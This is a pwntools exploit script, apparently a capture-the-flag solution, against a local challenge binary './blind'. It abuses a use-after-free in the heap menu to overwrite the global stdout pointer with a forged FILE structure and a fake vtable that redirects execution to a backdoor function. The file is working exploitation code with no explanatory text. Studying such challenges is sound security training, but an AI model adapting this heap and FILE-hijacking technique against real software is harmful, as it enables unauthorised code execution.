from pwn import *
context.log_level = "debug"
p = process("./blind")
elf = ELF("./blind")

cmd = lambda c : p.sendlineafter("Choice:" , str(c))
def new(idx , content):
	cmd(1)
	p.sendlineafter("Index:" , str(idx))
	p.sendlineafter("Content:" , str(content))

def edit(idx , content):
	cmd(2)
	if len(content) == 0x68:
		content = content[:-1]
	p.sendlineafter("Index:" , str(idx))
	p.sendlineafter("Content:" , str(content))

def free(idx):
	cmd(3)
	p.sendlineafter("Index:" , str(idx))

new(0 , "a") # \x10
new(1 , "b") # \x80
new(5 , "d")
free(0)
edit(0 , p64(0x602040 + 5 - 8))

new(2 , "c") # freed 0
padding_length = 0x602060 - (0x602040 + 5 + 8)
back_door = 0x4008E3

stdout = 0x602020
bss = 0x602020 + 0x300
log.info(hex(0x602040 + 5))
new(3 , "a" * padding_length + p64(stdout) + p64(bss) + p64(bss + 0x68) + p64(bss + 0x68 * 2) + p64(bss + 0x68 * 3))

fake_io_file = p64(0xfbad8000) + p64(0) * 3 + p64(0) * 4 # 8 
fake_io_file += p64(0) + p64(0) * 4 # write_end = write_ptr + 1 # 13 # 0x68
edit(1 , fake_io_file)
fake_io_file = p64(0) * 2 + p64(0) + p64(0)
fake_io_file += p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
fake_io_file += p64(0) * 4
edit(2 , fake_io_file)
fake_io_file = p64(0) + p64(bss + 0x68 * 3)
edit(3 , fake_io_file)
fake_vtable = p64(0) * 7 + p64(back_door)
edit(4 , fake_vtable)
edit(0 , p64(bss))

p.interactive()